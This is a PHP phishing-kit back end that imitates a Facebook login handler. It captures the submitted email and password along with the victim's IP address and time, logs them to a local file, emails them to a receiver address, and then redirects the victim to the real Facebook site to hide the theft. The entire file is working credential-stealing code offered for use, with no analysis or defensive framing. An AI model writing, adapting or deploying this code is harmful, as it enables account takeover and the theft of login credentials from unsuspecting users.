<?php

$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = get_ip();
$varEMAIL = $_POST['email'];
$varPASS = $_POST['pass'];
$message .= "xxxxxxxxxxxxxxxx+ Stored Emails +xxxxxxxxxxxxxxxx\n";
$message .= "user: ".$varEMAIL."\n";
$message .= "pass: ".$varPASS."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "RECIEVER EMAIL";
$subject = "New FaceBook Email | $ip";
$headers = "From: SENDER EMAIL";
$file = fopen("StoredEmails.txt","ab");
fwrite($file,$message);
fclose($file);
$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.facebook.com/");

function get_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
?>

